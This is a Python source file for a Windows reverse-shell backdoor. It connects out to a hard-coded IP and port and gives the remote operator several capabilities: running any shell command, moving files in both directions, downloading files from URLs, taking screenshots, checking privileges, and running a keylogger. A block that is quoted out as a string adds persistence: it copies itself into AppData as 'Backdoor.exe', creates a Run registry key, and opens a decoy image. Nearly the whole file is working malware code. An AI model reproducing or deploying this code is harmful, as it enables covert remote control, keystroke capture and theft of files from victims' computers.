#!/usr/bin/python3
import socket
import simplejson
import subprocess
import time
import shutil 
import os
import sys
import base64
import requests
import ctypes
from mss import mss
import keylogger
import threading

def json_send(data):
        json_data = simplejson.dumps(data)
        sock.send(json_data.encode("utf-8"))

def json_recv():
        json_data= ""
        while True:
                try:
                        json_data =json_data + sock.recv(1024).decode()
                        return simplejson.loads(json_data)
                except ValueError:
                        continue

def screenshot():
	with mss() as screenshot:
		screenshot.shot()
	
def is_admin():
	global admin
	try:
		temp= os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'),'temp']))
	except:
		admin="[!!] User Privileges!"
	else:
		admin="[+] Administrator Privileges!"

def download(url):
        get_response = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name,"wb") as out_file:
                out_file.write(get_response.content)

def  connection():
	while True:
		time.sleep(10)
		try:
			sock.connect(("192.168.43.147",54321))
			shell()
		except:
			connection()
def shell():
	while True:
		comnd = json_recv()
		try:
			if comnd =="q":
				try:
					os.remove(keylogger_path)
				except:
					continue
				break
			elif comnd == "help":
				help_options = '''
		download [path]-> Download a file from target PC
		upload [url] -> Upload a file to target PC
		get [url] -> Download a file to target from any website
		start [path] -> Start program on target PC
		screenshot -> Take a screenshot of Target PC
		check -> check for Administrator Privileges
		q -> Exit the reverse shell
						 '''
				json_send(help_options)
			elif comnd == "check":
				try:
					is_admin()
					json_send(admin)
				except:
					json_send("[!!] Failed to check privileges")
			elif  comnd[:2] == "cd" and len(comnd) > 1:
				try:
					os.chdir(comnd[3:])
				except:
					continue
			elif comnd[:8] == "download":
				try:
					with open(comnd[9:],"rb") as file:
						json_send(base64.b64encode(file.read()))
				except:
					failed = "failed to Dowload"
					json_send(base64.b64encode(failed))
			elif comnd[:6] == "upload":
				with open(comnd[7:],"wb") as fin:
					result = json_recv()
					fin.write(base64.b64decode(result))
			elif comnd[:3] == "get":
                		try:
                        		download(comnd[4:])
                        		json_send("[+] Download the File")
                		except:
                        		send("[!!] Failed to Download the file") 
			elif comnd[:5] == "start":
                        	try:
                                	subprocess.Popen(comnd[6:], shell=True)
                                	json_send("[+] Started")
                        	except:
                                	json_send("[!!] Failed to start")
			elif comnd[:10] == "screenshot":
				try:
					screenshot()
					with open("monitor-1.png","rb")as ss:
						json_send(base64.b64encode(ss.read()))
					os.remove("monitor-1.png")
				except:
					json_send("[!!] Failed to take screenshot")
			elif comnd[:12] == "keylog_start":
				t1= threading.Thread(target=keylogger.start)
				t1.start()
			elif comnd[:11]  == "keylog_dump":
				fn = open(keylogger_path, "r")
				json_send(fn.read())
			else:
				try:
					proc=subprocess.Popen(comnd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
					result=proc.stdout.read()+proc.stderr.read()
					json_send(result)
				except:
					json_send("[!!] Can't Execute that comand")
		except Exception:
			json_send("Error")

keylogger_path = "key.txt"
'''
keylogger_path =os.environ["appdata"] + "\\keylogger.txt"
location = os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
	name = sys._MEIPASS + "\solo.jpg"
	try: 
		subprocess.Popen(name, shell=True)
	except:
		number =3
		number1 =5 
		addition = number + number1
'''
sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()









